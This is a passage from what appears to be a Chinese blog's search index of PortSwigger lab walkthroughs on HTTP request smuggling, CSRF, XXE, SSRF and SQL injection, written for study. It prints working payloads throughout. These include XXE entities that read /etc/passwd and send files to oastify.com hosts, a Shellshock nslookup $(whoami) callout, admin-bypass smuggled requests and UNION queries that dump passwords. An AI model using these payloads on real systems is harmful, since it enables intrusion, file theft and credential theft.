of file extension with null byte bypass 在 URL 编码中，%00 可以用于表示字符串的结束符。 作用是将“.png”文件名截断，使得请求实际上是针对“/etc/passwd”这个文件的 1../../../etc/passwd%00.png","tags":["靶场","目录遍历"],"categories":["网络安全"]},{"title":"PortSwigger 靶场之 HTTP 请求走私","path":"/2022/07/15/http-request-smuggling/","content":"All labs | Web Security Academy (portswigger.net) HTTP request smuggling 1. HTTP request smuggling, basic CL.TE vulnerability HTTP 请求走私，基本的 CL.TE 漏洞 当 Content-Length 和 Transfer-Encoding 同时出现时，客户端应该遵循 Transfer-Encoding 的规则，而忽略 Content-Length，因为 Transfer-Encoding 机制会将消息体进行拆分 这关主要是通过更改 Content-Length 的值，发送带有 Transfer-Encoding 头部的正文来达到欺骗服务器的目的 12345678910POST / HTTP/1.1Host: 0a06001d03118aa0c4626eb800680067.web-security-academy.netConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 6Transfer-Encoding: chunked0G 2. HTTP request smuggling, basic TE.CL vulnerability HTTP 请求走私，基本的 TE.CL 漏洞 和第一关的区别是，这一关更改 Transfer-Encoding 的值，然后通过发送带有 Content-Length 的正文来欺骗服务器 声明了 Content-length 为 4，但随后使用了 Transfer-Encoding: chunked，这意味着请求体被分成多个部分（即块），每个块都包含一个十六进制的数字，表示该块的大小。第一个块的大小为 5c（十六进制，等于 92），所以后面的块包含了 92 个字符。 但是由于存在 TE.CL 漏洞，**服务器会忽略 Content-length，因此不会将前面的 4 个字符视为请求体的一部分。**相反，服务器会将第一个块的大小视为整个请求体的大小，从而导致攻击者可以向服务器发送包含恶意内容的块，这些内容被认为是请求体的一部分，但实际上并不包含在 Content-length 中声明的大小范围内。 123456789101112131415POST / HTTP/1.1Host: 0a83009b049ca08ec342d8a2002f0070.web-security-academy.netContent-Type: application/x-www-form-urlencodedContent-length: 4Transfer-Encoding: chunked5cGPOST / HTTP/1.1Content-Type: application/x-www-form-urlencodedContent-Length: 15\tx=10 3. HTTP request smuggling, obfuscating the TE header HTTP 请求走私，混淆 TE 标头 在请求中添加多个 Transfer-Encoding 头部来混淆或欺骗服务器。在这关中出现了两个 Transfer-Encoding 字段，一个值为 “chunked”，另一个值为 “cow”。 请求体的内容是经过编码的，其中包括了一个 GPOST 请求以及一个包含参数 x=1 的请求体。 1234567891011121314POST / HTTP/1.1Host: 0a5200a4048704c8c3857a68009c004f.web-security-academy.netContent-Type: application/x-www-form-urlencodedContent-length: 4Transfer-Encoding: chunkedTransfer-encoding: cow5cGPOST / HTTP/1.1Content-Type: application/x-www-form-urlencodedContent-Length: 15x=10 4. HTTP request smuggling, confirming a CL.TE vulnerability via differential responses HTTP 请求走私，通过差异响应确认 CL.TE 漏洞 第一个请求使用了 Transfer-Encoding: chunked 标头来指示请求体的长度为分块编码形式，并设置长度为0，表示请求体为空。 第二个请求使用了 Content-Length 标头来指示请求体的长度为35个字节。 这两个请求放在了一起，会解析出两个不同的请求，其中第一个请求不包含请求体，而第二个请求包含了一个长度为35个字节的请求体。 12345678910POST / HTTP/1.1Host: 0a6800d904fae8a2c5f918c700250023.web-security-academy.netContent-Type: application/x-www-form-urlencodedContent-Length: 35Transfer-Encoding: chunked0GET /404 HTTP/1.1X-Ignore: X 5. HTTP request smuggling, confirming a TE.CL vulnerability via differential responses HTTP 请求走私，通过差异响应确认 TE.CL 漏洞 第一个请求的数据块长度为 0x5e，即 94，后面跟着一个 POST 请求，其请求体为 x=1。 第二个请求的数据块长度为 0，表示这是最后一个数据块。 12345678910111213POST / HTTP/1.1Host: 0a7b005103ea6bc6c04abe7a0021006d.web-security-academy.netContent-Type: application/x-www-form-urlencodedContent-length: 4Transfer-Encoding: chunked5ePOST /404 HTTP/1.1Content-Type: application/x-www-form-urlencodedContent-Length: 15x=10 6. Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability 利用HTTP请求走私绕过前端安全控制，CL.TE漏洞 12345678910POST / HTTP/1.1Host: 0a51005204ee4262c4d91635002400a6.web-security-academy.netContent-Type: application/x-www-form-urlencodedContent-Length: 37Transfer-Encoding: chunked0GET /admin HTTP/1.1X-Ignore: X 本地用户localhost放入后，Host标头又冲突了 1234567891011POST / HTTP/1.1Host: 0a51005204ee4262c4d91635002400a6.web-security-academy.netContent-Type: application/x-www-form-urlencodedContent-Length: 54Transfer-Encoding: chunked0GET /admin HTTP/1.1Host: localhostX-Ignore: X 将第二段请求，改为正常的请求包 1234567891011121314POST / HTTP/1.1Host: 0a51005204ee4262c4d91635002400a6.web-security-academy.netContent-Type: application/x-www-form-urlencodedContent-Length: 116Transfer-Encoding: chunked0GET /admin HTTP/1.1Host: localhostContent-Type: application/x-www-form-urlencodedContent-Length: 10x= 删除用户： carlos 1234567891011121314POST / HTTP/1.1Host: 0a51005204ee4262c4d91635002400a6.web-security-academy.netContent-Type: application/x-www-form-urlencodedContent-Length: 139Transfer-Encoding: chunked0GET /admin/delete?username=carlos HTTP/1.1Host: localhostContent-Type: application/x-www-form-urlencodedContent-Length: 10x= 7. Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability 利用 HTTP 请求走私绕过前端安全控制，TE.CL 漏洞 1234567891011121314POST / HTTP/1.1Host: 0ad7006803f46b57c050ebab00be0094.web-security-academy.netContent-length: 4Transfer-Encoding: chunked60POST /admin HTTP/1.1Content-Type: application/x-www-form-urlencodedContent-Length: 15x=10 12345678910111213141516POST / HTTP/1.1Host: 0ad7006803f46b57c050ebab00be0094.web-security-academy.netContent-Type: application/x-www-form-urlencodedContent-length: 4Transfer-Encoding: chunked71POST /admin HTTP/1.1Host: localhostContent-Type: application/x-www-form-urlencodedContent-Length: 15x=10 删除用户carlos： 123456789101112131415POST / HTTP/1.1Host: 0ad7006803f46b57c050ebab00be0094.web-security-academy.netContent-length: 4Transfer-Encoding: chunked87GET /admin/delete?username=carlos HTTP/1.1Host: localhostContent-Type: application/x-www-form-urlencodedContent-Length: 15x=10 8. Exploiting HTTP request smuggling to reveal front-end request rewriting 利用 HTTP 请求走私来揭示前端请求重写 观察搜索功能看它是否反映了参数值search 1234567891011121314POST / HTTP/1.1Host: 0a4c00e3048d07c6c2e4396b00320006.web-security-academy.netContent-Type: application/x-www-form-urlencodedContent-Length: 124Transfer-Encoding: chunked0POST / HTTP/1.1Content-Type: application/x-www-form-urlencodedContent-Length: 200Connection: closesearch=test 第一次请求标头的名称，用它来访问管理面板： 123456789101112131415POST / HTTP/1.1Host: 0a4c00e3048d07c6c2e4396b00320006.web-security-academy.netContent-Type: application/x-www-form-urlencodedContent-Length: 143Transfer-Encoding: chunked0GET /admin HTTP/1.1X-OhZACS-Ip: 127.0.0.1Content-Type: application/x-www-form-urlencodedContent-Length: 10Connection: closex=1 更改走私的请求 URL 以删除用户carlos 123456789101112131415POST / HTTP/1.1Host: 0a4c00e3048d07c6c2e4396b00320006.web-security-academy.netContent-Type: application/x-www-form-urlencodedContent-Length: 166Transfer-Encoding: chunked0GET /admin/delete?username=carlos HTTP/1.1X-OhZACS-Ip: 127.0.0.1Content-Type: application/x-www-form-urlencodedContent-Length: 10Connection: closex=1 9. Exploiting HTTP request smuggling to capture other users’ requests 利用 HTTP 请求走私来捕获其他用户的请求 访问博客文章并发表评论，抓包请求 需要慢慢增加走私请求中 Content-Length 标头的值，直到捕获整个 cooki 1234567891011121314POST / HTTP/1.1Host: 0a5f00f5030f2821c174b72d00c100e3.web-security-academy.netContent-Type: application/x-www-form-urlencodedContent-Length: 256Transfer-Encoding: chunked0POST /post/comment HTTP/1.1Content-Type: application/x-www-form-urlencodedContent-Length: 600Cookie: session=enYe7PbIpOv50lcgDeOWdEO3Ymf6m7dqcsrf=XsZYgcHX6NuQAkteJIBenpeAfd8nNMiY&amp;postId=5&amp;name=Carlos+Montoya&amp;email=carlos%40normal-user.net&amp;website=&amp;comment=comment+2 10. Exploiting HTTP request smuggling to deliver reflected XSS 利用 HTTP 请求走私来传递反射 XSS","tags":["靶场","HTTP 走私"],"categories":["网络安全"]},{"title":"portswigger 靶场之 CSRF 篇","path":"/2022/07/11/csrf/","content":"Cross-site request forgery (CSRF) All labs | Web Security Academy (portswigger.net) 1. 没有防御措施的 CSRF 漏洞 题目中已告知易受攻击的是电子邮件的更改功能，而目标是利用 csrf 漏洞更改受害者的电子邮件地址，最后给出了登录凭据：wiener:peter。 登录 wiener 用户——首先做的事是根据给定的登录凭据进行登录，点击 My account 登录，登录后就到了一个更改邮箱的界面，这时候然设置代理以便 burp 抓包。 burp 抓包——尝试输入test@test.ca，点击 update email，通过 burp 抓包，发送到 repeater 后关闭拦截，此时回到更改邮箱的界面发现电子邮件已被更改为test@test.ca 。 进行 csrf 攻击——因为 burp 有自动生成脚本的功能，右键 Generate CSRF PoC，进入界面后在选项一栏把自动提交脚本勾选上，这时候 burp 会自动提交表单不需要自己点击提交了。点击 regenerate 重新生成发现多了document.forms[0].submit();。 进行 csrf 攻击——把代码中的 emali 修改为testcsrf1@test.ca以便测试之用，接着 copyhtml，转到漏洞利用服务器，在 body 中放入 html，store 保存，点击 View exploit 查看漏洞，最后 Deliver to victim，传递给受害者即可成功 生成 CSRF PoC CSRF HTML 修改成功 2. token 验证取决于请求方法 登录 wiener 用户——依旧是账号密码进行登录，wiener:peter，然后在更改邮箱的界面输入test@test.ca进行抓包 改变请求方法——因为 POST 请求会对 token 验证（在没有 token 的情况下会 404），从而无法修改邮箱，而 GET 不需要。于是右键 burp 点击 Change request method，将请求方法从 POST 更改为 GET 在 POST 请求下删掉 token 会404 GET 请求下没有 token 进行 csrf 攻击在 burp 中右键生成 csrf poc，选项中把自动提交脚本选择上，代码中的 emali 修改为testcsrftoken1@test.ca，copy html，用 burp 的服务器托管脚本，粘贴到 body 中。最后点击&quot;Store&quot;，并发送给受害者，完成试验 成功修改了邮箱 3. token 验证取决于 token 的存在 在上一个关卡，请求改为 GET 是因为检查了 POST 方法是否允许我们删除 token，删除 token 后，POST 请求 404， 所以可以用 GET 方法进行绕过 在这一关中攻击者删除 token，返回 302。这说明 token 不存在请求便会通过，简单粗暴 右键生成 CSRF Poc，后续步骤和前面一致 token 删掉返会状态码 302 4. token 与用户会话无关 题目给出了两个账户 攻击者账户——wiener:peter 受害者账户——carlos:montoya 登录两个账户——把两个账户分别分别登陆，目标是从 wiener 那更改 carlos 的电子邮件地址 使用 firefox 登录账户 改变请求方法——拦截 wiener 的请求在 burp 中查看，删除 csrt token 的一个字符返回 404，请求方法改为 GET，依旧是 404 修改邮件拦截请求 根据前两个实验室，均以失败告终 从 carlos 用户中找到 CSRF Token——登录 carlos，在更改邮箱的界面打开“开发者工具”找到 CSRF Token，复制后在 burp 中粘贴到相应位置，返回 302 这说明虽然应用程序需要一个 token 处理请求，但不关心它是怎么来的。换言之，应用系统仅会验证 CSRF Token 的有效性，而不会验证该 Token 是否属于当前用户，也就是标题说的 Token 不会与用户会话绑定 进行 csrf 攻击——最后利用 burp 的 csrf poc 功能，复制 html 后需要回到攻击者 wiener，刷新 carlos 的网页来收集新的 token（token 随着请求的变化而变化）替换到 burp 中 5. token 绑定到非会话 cookie 题目给出了两个账户 攻击者账户——wiener:peter 受害者账户——carlos:montoya 测试 CSRF Token 和 CSRF Cookie 抓包 wiener 用户 ——发现 Cookie 中存在一个 csrfkey。删除 CSRF Token 的某个字符则返回 400。 查看 carlos 用户的 CSRF Token——从另一个用户查看 Cookie 是否相互绑定。登录另一个用户(carlos)，可以在火狐无痕窗口，查看 CSRF Token，粘贴到 wiener 用户的 burp，send 发送后 400。 查看 carlos 用户的 CSRFKey cookie——在 carlos 账户中，点开网络，点重新载入，找到 CSRFKey cookie。粘贴到 wiener 用户的 burp，send 发送后 302，这说明两者没有进行绑定的，可喜可贺。 **wiener 用户首页搜索框中 CSRFKey 参数注入 **——在 wiener 账户的首页发现有搜索框，输入“ceui”进行抓包处理，能看到搜索的关键词在 Set-Cookie 标头。因为搜索功能没有 CSRF 保护，所以可以轻而易举的注入 cookie。 将已知的 csrfKey cookie 注入给被攻击者 12/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None# SameSite=None——显式设置 SameSite=None（一个新值），该值表示放弃对 Cookie 的 Same-Site 策略设置，通俗说就是“我不管了”。 抓包查看 Set-Cookie 标头 URL 编码 利用此漏洞将 cookie 注入受害者的浏览器 csrf 攻击——最后存储漏洞，单击“交付给受害者”。 在 wiener(攻击者) 用户的 burp 请求中右击生成 PoC 6. token 在 cookie 中重复 如图所示，应用程序只需验证在请求参数中提交的 Token 是否与 Cookie 中提交的值匹配 搜索，查看 Set-Cookie 标头中是否有搜索词 将虚假 CSRF Cookie 注入受害者浏览器的 URL 最后注入 cookie 并提交表单 7. Referer 验证取决于 header 是否存在 登录帐户，抓取“更新电子邮件”表单的请求 在 burp 中查看，发现出现了 Referer，删除则返回 302 即成功 在 HTTP 头中有一个字段叫 Referer，记录了该 HTTP 请求的*来源地址*，同源检测（Origin 和 Referer 验证） 生成 PoC 网页返回 “Invalid referer header”，这是因为 Referer 的来源是 burp 禁止 Referer 标头，&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;，作用是控制页面发送给 server 的 referer 信息，告诉服务器端用户是从哪个页面来到当前网页的。 no-referrer： 所有请求不发送 referrer 更新电子邮件表单的请求 burp 右击生成 PoC 因为有 Referer 限制而无效 Referer 来源于 burp，这才导致错误 成功修改 8. Referer 验证失效的 CSRF 登录帐户，抓取“更新电子邮件”表单的请求 追加到 Referer 标头请求成功，这说明网站似乎接受任何包含预期的 Referer 标头 在 script 中编辑 JavaScript 1history.pushState(&quot;&quot;, &quot;&quot;, &quot;/?0aac003b03b74a00c0510db300a200ff.web-security-academy.net&quot;) 在头部添Referrer-Policy: unsafe-url，是因为需要请求中包含完整的 URL ，以此来覆盖浏览器的默认配置（默认从 Referer 标头中删除查询字符串） 追加到 Referer 标头 history.pushState() 添加 history.pushState() 在漏洞利用服务器中","tags":["靶场","CSRF"],"categories":["网络安全"]},{"title":"Portswigger 靶场之 XML 外部实体 (XXE) 注入","path":"/2022/06/28/xml-external-entity-attack/","content":"All labs | Web Security Academy (portswigger.net) 1. Exploiting XXE using external entities to retrieve files 使用外部实体利用 XXE 来检索文件 检查库存功能用 burp 截断数据包，然后松手在 HTTP History 中查看请求，转到 Repeater。 往下看，当看到 XML 的时候，应该考虑 XXE 注入。接下来就是找到注入点，具体位置有两个，一个是 productId，另一个是 storeId。 在 XML 声明和元素 stockCheck 之间插入外部实体定义。 123&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;# 定义了一个名为 xxe 的实体，它指向文件系统中的 /etc/passwd 文件。 2. Exploiting XXE to perform SSRF attacks 利用 XXE 执行 SSRF 攻击 依旧是抓包检查库存功能，会发现有一个包含 XML 的帖子请求。 声明一个外部实体，不再引用本地文件而是查看是否可以发送到 IP 地址169.254.169.254 Send 发送请求，从响应中得到目录，连续往下遍历目录，最后获得敏感信息。 3. Blind XXE with out-of-band interaction 带外交互的盲 XXE 访问产品页面，单击“检查库存”并在 Burp 中拦截请求。 定义外部实体，插入 Burp 的协作子域名。转到“子域名”选项卡，然后单击“Poll now”。 可以看到 DNS 和 HTTP 交互。它的作用是，确认我们可以让应用程序与攻击者控制的对话服务器，为带外渗透做好准备 1&lt;!DOCTYPE stockCheck [ &lt;!ENTITY xxe SYSTEM &quot;http://1hj71n3ymgjdmmtrt6ye3mqcf3lt9i.oastify.com&quot;&gt; ]&gt; 4. Blind XXE with out-of-band interaction via XML parameter entities 通过 XML 参数实体进行带外交互的盲 XXE 外带交互的盲 XXE 是通过利用 XML 解析器向==外部服务器（burp 子域）==发送数据，使得攻击者可以==通过外部服务器与目标系统进行交互==。 12345&lt;!DOCTYPE stockCheck [&lt;!ENTITY % xxe SYSTEM &quot;http://1hj71n3ymgjdmmtrt6ye3mqcf3lt9i.oastify.com&quot;&gt; %xxe; ]&gt;# 定义了一个名为 xxe 的参数实体，它指向一个远程 URL http://……# 使用了 % 操作符来引用实体，%xxe --&gt; 表示引用实体xxe# XML 文档被解析时，实体引用（%xxe; ）将会被展开并替换为实体声明中的值（也就是远程 URL），而可能导致系统被攻击者控制的服务器接管。 Quote / 参考 盲XXE（Blind XXE），它可以在没有直接访问应用程序响应的情况下，仍能从应用程序中获取敏感信息。 5. Exploiting blind XXE to exfiltrate data using a malicious external DTD 利用盲 XXE 使用恶意外部 DTD 泄露数据 12345678910&lt;!ENTITY % file SYSTEM &quot;file:///etc/hostname&quot;&gt;&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#x27;http://0abk7wm21os9liaqg27kek4ic9iz6o.oastify.com/?x=%file;&#x27;&gt;&quot;&gt;%eval;%exfil;# 定义了一个名为 file 的外部实体，它包含了 /etc/hostname 文件的内容。可以利用此实体来访问并泄露目标系统中的文件内容# 这一行定义了一个名为 eval 的外部实体，它包含了一个实体声明 exfil，该实体可将 file 实体的内容发送到攻击者控制的服务器。exfil实体的定义包括一个URL，该URL包含攻击者控制的服务器地址和将file实体的内容作为查询参数的字符串。在这种情况下，exfil实体将文件内容发送到http://0abk7wm21os9liaqg27kek4ic9iz6o.oastify.com/，并将file实体的内容作为查询参数x的值。# %eval; %exfil; 这两行将eval实体和exfil实体插入到XML文档中。攻击者可以将这些实体插入到一个合法的XML文档中，并发送给目标系统进行解析。在解析XML文档时，目标系统将解析eval实体，然后解析exfil实体，从而触发将file实体的内容发送到攻击者控制的服务器的行为。 将 DTD 文件保存在服务器上，单击“查看漏洞”并记下 URL；用 burp 截断检查库存的请求，定义外部实体 最后返回 Burp Collaborator client，会看到一些 DNS 和 HTTP 交互，特别关注 HTTP 交互，可能包含文件的内容。/etc/hostname 1&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &quot;https://exploit-0a57006c0302b2d5c0e221d8013c0082.exploit-server.net/exploit&quot;&gt; %xxe;]&gt; 6. Exploiting blind XXE to retrieve data via error messages 利用盲 XXE 通过错误消息检索数据 1234&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#x27;file:///invalid/%file;&#x27;&gt;&quot;&gt;%eval;%exfil; 将 DTD 文件保存在服务器上，单击“查看漏洞”并记下 URL；用 burp 截断检查库存的请求，定义外部实体，会看到一条包含文件内容错误消息 1234&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &quot;https://exploit-0a42007304c1c092c003856801a900e4.exploit-server.net/exploit&quot;&gt; %xxe;]&gt;# 定义了一个名为 foo 的 DTD 声明，其中包含了一个名为 xxe的 外部实体。# xxe 实体的定义包括一个 URL，该 URL 指向服务器上的一个文件，文件包含敏感信息。在这种情况下，可以将获取的信息发送到 https…… 7. Exploiting XInclude to retrieve files 利用 XInclude 检索文件 抓包检查库存功能，修改 productId 的值 12345&lt;foo xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;&lt;xi:include parse=&quot;text&quot; href=&quot;file:///etc/passwd&quot;/&gt;&lt;/foo&gt;# 这个XML文档定义了一个名为foo的元素，并且通过XML命名空间定义了一个名为xi的前缀，它的命名空间是&quot;http://www.w3.org/2001/XInclude&quot;。然后，它使用了`xi:include`元素来指定要包含的内容，包括`parse`和`href`属性。# parse属性指定了包含的文件是以文本方式解析的，而不是XML方式解析。href属性指定了要包含的文件的路径，这里是file:///etc/passwd，也就是本地系统上的/etc/passwd文件。由于该文件包含有关用户帐户的信息，因此攻击者可以使用这种技术来收集系统信息并进行其他攻击。 8. Exploiting XXE via image file upload 通过图像文件上传利用XXE 下载一个SVG 文件（注意不要太大），上传 SVG 文件，发表评论的时候抓包，修改 SVG 文件的内容 Expand / 拓展 SVG 文件是由 XML 构成的，因此可以使用 XML 的各种功能来嵌入数据或 payload 到 SVG 图像中。由于 SVG 图像可以包含文本、图形和脚本等元素，因此可以使用这些元素来嵌入payload 123&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot;?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/hostname&quot; &gt; ]&gt;&lt;svg width=&quot;128px&quot; height=&quot;128px&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; version=&quot;1.1&quot;&gt;&lt;text font-size=&quot;16&quot; x=&quot;0&quot; y=&quot;16&quot;&gt;&amp;xxe;&lt;/text&gt;&lt;/svg&gt;# 当SVG文件被处理时，xxe实体会被解析为文件/etc/hostname的内容，然后将该内容作为文本元素的内容插入到SVG图像中，从而显示该文件的内容。 9. Exploiting XXE to retrieve data by repurposing a local DTD 利用 XXE 通过重新调整本地 DTD 的用途来检索数据 抓包检查库存功能 123456789101112&lt;!DOCTYPE message [&lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;&lt;!ENTITY % ISOamso &#x27;&lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;&lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;&amp;#x25;eval;&amp;#x25;error;&#x27;&gt;%local_dtd;]&gt;# 定义名为“file”的实体，并将其设置为/etc/passwd文件的路径，然后通过将这个实体插入到另一个名为“eval”的实体中，最终触发了漏洞，导致可以读取系统上的/etc/passwd文件的内容。同时，攻击者也定义了一个名为“error”的实体，用于报告错误信息。","tags":["靶场","XXE"],"categories":["网络安全"]},{"title":"portswigger 靶场之 SSRF 篇","path":"/2022/06/20/ssrf/","content":"All labs | Web Security Academy (portswigger.net) 1. 针对本地服务器的基本 SSRF **易受攻击的参数是：**库存检查功能 **目标：**更改 URL 来访问http://localhost/admin并删除用户carlos 分析： URL 浏览到 /admin 目录返回一个错误，指出该目录仅可从服务器本地使用，或对已登录的管理员可用。 找到库存检查功能，打开 burp 进行拦截并发送到 repeater，库存将发出与后端 API 通信的请求。在 burp 中观察到有个参数是stockApi，有 http 字样，判断为编码后 URL。通过 Ctrl+Shift+U 对 URL 解码后，能够看到库存检查功能的 URL 路径和端口号。 查看是否有应用程序在本地主机上运行，将stockApi值换为http://localhost，发送后显示成功，点开 burp 的 Render，能够看到网站页面上有Admin panel字样，说明进入了管理面板 在 Response 中搜索 admin，可看到Admin panel的路径是/admin，把路径添加到 stockApi 上后，继续在 Response 中搜索 carlos，可看到删除的路径是/admin/delete?username=carlos 删除 carlos：http://localhost/admin/delete?username=carlos，遵循 302 重定向 检查库存功能 对 URL 进行解码 访问本地 找到了删除的路径 返回查看成功 2. 针对另一个后端系统的基本 SSRF **易受攻击的参数是：**库存检查功能 **目标：**SSRF 扫 IP 并删除用户carlos 分析： 通过 burp suite 在库存检查功能处抓包，发送到Intruder，对 IP 地址的最后一位“添加有效载荷 §”，type 填 Number，From 1 To 255 Step 1，然后 Start attack。 攻击完后通过 Status 排序，找到不一致的发送到 Repeater，在最后面添加/admin 在 Response 中搜索 carlos，可看到删除的路径是admin/delete?username=carlos 对 URL 编码后发送，遵循 302 重定向，返回即可看到已成功http://192.168.0.18:8080/admin/delete?username=carlos 通过 python 3. 带有基于黑名单的输入滤波器的 SSRF 易受攻击的参数是： 库存检查功能 目标： 访问 http://localhost/admin 的管理界面并删除用户carlos 分析： 打开 burp 抓包，修改参数为http://localhost/失败了，然后修改为http://127.0.0.1也失败了，再次修改为http://127.1，因为会自动填充缺少的两位八位字节，点击发送发现渲染出来了 这说明，没有对127.1进行正则匹配（所以设置白名单比黑名单更好） 还可以把 IP 地址进行 16 进制编码或者 8 进制 16 进制 --&gt; 7F000001 10 进制 --&gt; 2130706433 后面加入/admin，发送后失败了在 burp 中右击Convert selection对 admin 进行编码，或者大小写绕过，最后找到路径直接删除用户即可 测试 http://127.1 大小写绕过 两次 URL 编码 4. 通过开放重定向漏洞旁路过滤器的 SSRF 要点： Open redirect 分析： 抓包库存检查功能和Next produst并发送到 Repeater，重命名为 Check stock、Next product 在 Next product 中通过测试 path 参数，观察到 path 参数被放置在Location响应标头中，Location 响应标头表示 URL 需要重定向页面 应用程序先验证 stockAPI 参数的 URL 是否在允许的域中，紧接着应用程序请求 URL，触发重定向，遵循重定向，向攻击者构造的内部 URL 发出请求 stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos 拦截 重定向 重定向到管理界面 重定向到删除 5. 带外检测的盲 SSRF 在加载产品页面时用 burp 抓包，找到 Referer 标头，开启 Collaborator client 把网址替换为 Referer 6. 带有基于白名单的输入滤波器的 SSRF 要点： 利用 URL 解析中的不一致性来绕过过滤器 步骤： 首先发出请求http://loaclhost，发现响应告诉我们主机名必须是stock.weliketoshop.net 使用@在主机名之前的 URL 中嵌入凭据，参数改为http://127.0.0.1@stock.weliketoshop.net 使用两次 URL 编码后的#使 @stock.weliketoshop.net 失效。#代表网页中的一个位置，位置的标识符 发出请求http://127.0.0.1%2523@stock.weliketoshop.net即可成功。后面步骤与之前面没有差别了 7. 盲目 SSRF 与壳冲击利用 **要点：**SSRF 在 Referer， UA 带 Shell shock payload 步骤： 从 BApp Store 安装“Collaborator Everywhere”扩展，把域名添加到 Burp，以便 Collaborator Everywhere 观察 回到浏览器，浏览产品页面后点击 return，如此反复，由此产生 HTTP 交互，回到 burp，观察 HTTP 请求中的 User-Agent，并发送到 Intruder 使用 Burp Collaborator 客户端，更改 Referer 标头，http://192.168.0.1:8080 IP 地址的最后一个八位字节，添加 § 1() &#123; :; &#125;; /usr/bin/nslookup $(whoami).yac7iwqg4tsdlyai7czxo0rrcii96y.oastify.com Payloads 窗口，将 payload 类型为 Numbers，1、255、1，开始攻击 攻击完成后，回到 Burp Collaborator 客户端，点击 Poll now，能够看到 DNS 交互和操作系统用户的名称 需要输入操作系统用户的名称即可成功 安装 添加域名 观察 UA 攻击 利用 python","tags":["靶场","SSRF"],"categories":["网络安全"]},{"title":"portswigger 靶场之 SQL 注入","path":"/2022/06/15/sql-injection/","content":"All labs | Web Security Academy (portswigger.net) WHERE 子句中的 SQL 注入漏洞允许检索隐藏数据 目的为查看隐藏的数据，所有产品 URL 中输入单引号，查看是否存在漏洞，服务器返回一个错误，借以得知容易受到 SQL 注入攻击 URL 中输入'+OR+1=1-- （查询字符串中空格被编码成+号） 数据库执行的 SQL 查询则为 12SELECT * FROM products WHERE category = &#x27;&#x27;or 1=1-- &#x27; AND released = 1 通过'来闭合参数，-- 来注释后半部分 bp 允许绕过登录的 SQL 注入漏洞 目的为以管理员用户登录应用程序 尝试账号密码为admin。网页显示，Invalid username or password，无效的用户名或密码，故此不知道是用户名还是密码错误。 从实验室说明中查的用户名为administrator 在Username中输入any' or 1=1 -- ，密码随便写毕竟会被注释掉 用any'来闭合参数，or一个为真即可通过，-- 是 sql 的注释语法注释掉后面的密码 在Username中输入administrator'-- ，密码随便写毕竟会被注释掉 浏览器连上代理，在登录页面用 bp 抓包，修改其参数 SQL 注入 UNION 攻击，确定查询返回的列数 目的为查找列数为多少，两种方法，可以用order by和union ORDER BY 关键字用于对结果集按照一个列或者多个列进行排序 UNION 操作符用于合并两个或多个 SELECT 语句的结果集。 URL 中输入' order by 1-- ' order by 2-- ' order by 3-- 网站正常显示 直到输入了“ ' order by 4--”，服务器抛出了一个错误，这表明试图排序的列不存在，也就是说只有 3 列 URL 中输入' union select null-- ' union select null,null-- 服务器皆返回了一个错误，这表明不只有一两列存在 ' union select null,null,null-- 网站正常显示，这说明是有三列数据存在 在 bp 中 浏览器需要进行 URL 编码，在 bp 中 可以用快捷键 Ctrl + U 来为其添加 确定列数为 3 SQL 注入 UNION 攻击，查找包含文本的列 通过枚举' order by 数字--'得知总共有 3 列数据存在 然后在' union select null,'1',null-- 的参数中替换字符串数据借以得知与哪列相匹配 错误的话，说明不是字符串类型的 成功，数据类型是“字符串” 最后替换文中所给的字符串 SQL注入 UNION 攻击，从其他表中检索数据 检索所有用户名和密码，administrator 得知数据库包列名为users username password 通过联合查询查找空字符串，' union select null,null--得知可以返回两列 测试' union select '1','2'--得知两列为字符串类型 最后通过' union select username,password from users--得知账号密码登录即可 后台 SQL 查询为 12select &amp; from products where category = &#x27;Gifts&#x27; union select username,password from users-- &#x27; AND released = 1 SQL注入UNION攻击，在单个列中检索多个值 用' order by'来迭代 ' order by 3服务器显示错误提示，得知列数为 2 通过 ' union select null,'a'-- 来看是否接收字符串类型 页面正常输出表示可以接受字符串类型 数据库 ' union select null,version()--——查询PostgreSQL数据库版本 网站返回结果，说明数据库是PostgreSQL ' union select null,@@version--——查询MySQL数据库版本 失败 在单个列中检索需要用到字符串的连接，PostgreSQL的连接为|| ' union select null,username ||'_'|| password from users-- administrator_9wif5hcpr46lfc99l2yi SQL注入攻击，查询 Oracle 上的数据库类型和版本 用' order by'来迭代找到列数 ' order by 3-- '500，实践证明列数为 2 1234-- Oracle 查询数据库版本Oracle\tSELECT banner FROM v$versionSELECT version FROM v$instance 在 URL 或者 bp 软件中输入' union select null,banner from v$version-- ' SQL注入攻击，在 MySQL 和 Microsoft 上查询数据库类型和版本 依然是 '+order+by+3--+两列 ' union select @@version,null-- SQL注入攻击，列出非 Oracle 数据库上的数据库内容 通过' union select null,null-- '查得是两列 其次确定每列的字段数据类型 查询数据库类型 PostgreSQL 查询数据库应为' union select version(),null-- '，查询结果为 200，说明数据库是PostgreSQL PostgreSQL SELECT * FROM information_schema.tables ELECT * FROM information_schema.columns WHERE table_name = ‘TABLE-NAME-HERE’` 紧接着，要列出数据库中存在的表以及这些表包含的列 表 ' union select 